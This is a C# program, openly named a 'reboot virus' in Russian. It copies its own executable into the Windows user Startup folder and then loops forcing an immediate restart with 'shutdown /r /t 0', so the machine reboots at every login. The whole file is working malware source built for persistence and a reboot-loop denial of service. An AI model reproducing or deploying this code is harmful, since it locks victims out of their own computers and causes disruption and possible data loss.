using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace АХТУНГ____вирусняк_перезагрузки
{
    class Program
    {
        static void Main(string[] args)
        {
            start:
            // Получаем путь к текущему исполняемому файлу
            string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;
            string executableName = Path.GetFileName(currentExecutablePath);

            // Получаем путь к папке автозагрузки текущего пользователя
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destinationPath = Path.Combine(startupFolderPath, executableName);

            // Проверяем, есть ли программа в автозагрузке
            if (File.Exists(destinationPath))
            {
                try
                {
                    Process.Start("shutdown", "/r /t 0");
                    Console.WriteLine("ПОЛУЧИЛОСЬ !!!! ахтунг");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при попытке перезагрузки: {ex.Message}");
                }
            }
            else
            {
                try
                {
                    File.Copy(currentExecutablePath, destinationPath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при копировании файла: {ex.Message}");
                }
            }
            goto start;
        }
    }
}
